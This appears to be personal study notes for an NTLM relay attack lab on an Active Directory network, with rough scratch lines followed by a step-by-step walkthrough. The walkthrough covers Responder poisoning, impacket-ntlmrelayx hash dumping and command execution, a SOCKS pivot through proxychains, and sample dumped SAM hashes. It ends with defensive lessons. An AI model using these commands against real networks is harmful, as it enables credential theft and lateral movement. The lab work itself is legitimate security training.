SMB relay


First step
 Discosver host without SMB signing enabled. And we can use nmap for that. And I want to show you a few

sudo pkill -f responder
sudo pkill -f ntlmrelayx
sudo nano /etc/responder/Responder.conf


 sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
sudo impacket-ntlmrelayx -tf targets.txt -smb2support --dump








Nc 127.0.0.1:11000



NTLM Relay Attack Lab — Full Step-by-Step Summary (Modern Workflow)
Lab Goal
Simulate a real enterprise attack chain where an attacker:
Discovers a host vulnerable to SMB relay


Poisons name resolution (LLMNR/NBT-NS/WPAD)


Captures NTLM authentication


Relays authentication to another machine


Gains admin access, dumps hashes, and pivots


Environment:
Kali attacker VM → 10.0.2.15


Domain Controller → 10.0.2.14


Victim Client 1 → 10.0.2.16


Victim Client 2 → 10.0.2.17



STEP 1 — Discover hosts vulnerable to SMB relay
We must confirm SMB signing is disabled.
If SMB signing is enabled → relay fails.
Scan the network:
nmap --script smb2-security-mode -p445 10.0.2.0/24
We are looking for:
Message signing enabled but not required
This means the machine is vulnerable to NTLM relay.
Targets identified:
10.0.2.16
10.0.2.17
Create target list:
nano targets.txt
Contents:
10.0.2.16
10.0.2.17

STEP 2 — Start LLMNR/NBT-NS poisoning (Responder)
Purpose:
 When a Windows machine tries to access a resource that doesn’t exist,
 it broadcasts asking “who has this host?”
Responder answers:
 “ME 🙂”
Start Responder in relay mode:
sudo responder -I eth0 -dwv
Key idea:
 We are not capturing hashes yet.
 We are tricking machines into authenticating to us.

STEP 3 — Start NTLM Relay attack
Instead of cracking hashes, we relay authentication in real time.
Option A — Dump hashes automatically
sudo impacket-ntlmrelayx -tf targets.txt -smb2support --dump-hashes
Option B — Create pivot (modern workflow)
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks
This creates a SOCKS proxy for lateral movement.
You should see:
SOCKS proxy started. Listening on 127.0.0.1:1080

STEP 4 — Trigger authentication from victim
This is the “user mistake” part.
In the lab, we simulate it manually.
On victim machine:
File Explorer → \\FAKE-SHARE
Windows attempts authentication →
 Responder intercepts →
 ntlmrelayx relays credentials.

STEP 5 — Successful NTLM relay
You observed this in logs:
Authenticating connection SUCCEED
nt authority\system
Meaning:
 The victim authenticated to another machine as admin.
This proves relay success.

STEP 6 — Dump local password hashes
Modern ntlmrelayx automatically dumps SAM database:
Example output:
Administrator:500:...:7facdc498ed1680c4fd1448319a8c04f
pepterparker:1001:...:64f12cddaa88057e06a81b54e73b949b
This is full credential compromise.

STEP 7 — SOCKS Pivot (Modern Attack Phase)
Instead of instant shell (old labs),
 we pivot through the compromised host.
Check active sessions:
ntlmrelayx> socks
You saw:
SMB 10.0.2.17 MARVEL/FCASTLE TRUE
Meaning:
 We now have a live authenticated tunnel into the network.

STEP 8 — Configure proxychains
Edit config:
sudo nano /etc/proxychains4.conf
Add at bottom:
socks5 127.0.0.1 1080

STEP 9 — Pivot into target via SMB
Use the relayed session:
proxychains4 smbclient -L //10.0.2.17 -U ''
We are now browsing the target as an admin without knowing the password.
This is lateral movement.

Why this lab matters
This attack shows how attackers move in real networks:
No malware needed


No password cracking required


No phishing required


Just:
Default Windows behavior


Misconfigured SMB signing


NTLM authentication reuse


One mistake → entire domain compromised.

Key Lessons Learned
• SMB signing prevents NTLM relay
 • LLMNR/NBT-NS should be disabled
 • NTLM should be restricted
 • Modern attacks rely on pivoting, not instant shells
 • New Windows versions make the attack harder but still possible

Attack Chain Summary
Recon → Poison → Capture → Relay → Dump → Pivot → Lateral Movement
This is a full real-world Active Directory attack path.

